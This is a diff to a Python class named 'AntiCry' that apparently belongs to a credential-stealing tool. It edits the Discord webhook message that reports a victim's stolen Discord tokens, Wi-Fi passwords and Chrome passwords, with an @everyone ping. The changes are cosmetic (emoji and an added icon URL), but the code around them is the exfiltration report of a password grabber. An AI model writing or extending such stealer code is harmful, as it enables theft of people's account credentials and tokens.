@@ -324,7 +324,7 @@ class AntiCry:
                             },
                             {
                                 "name": "<:z_logo_trustpilot:1040751302294122507> **System Files**",
-                                "value": f"<:wh_star:1102019798390542426>**{discord_tokens[0]}**\n<:wh_star:1102019798390542426>**{wifi_passwords}**\n<:wh_star:1102019798390542426>**{chrome_passwords}**\n<:wh_star:1102019798390542426>**{self.ErrorLog()}**"
+                                "value": f"<a:Purple_Lego_Coin:1152994436922474578>**{discord_tokens[0]}**\n<a:Purple_Lego_Coin:1152994436922474578>>**{wifi_passwords}**\n<a:Purple_Lego_Coin:1152994436922474578>**{chrome_passwords}**\n<a:Purple_Lego_Coin:1152994436922474578>**{self.ErrorLog()}**"
                             },
                         ],
                         "author": {
@@ -339,6 +339,7 @@ class AntiCry:
 
             heading = {
                 "content": f"**AntiCry** ||@everyone||",
+                "icon_url": "https://cdn.discordapp.com/attachments/1151144869495058474/1159556408983961661/1200px-Green_Star_Artwork_-_Super_Mario_3D_World_1.png?ex=6531740f&is=651eff0f&hm=fef50e66a850dc954b00a0af1042977d5453f7d402e735398d75e56b4daecf79&",
                 "embeds": [embed],
                 "username": "AntiCry"
             }
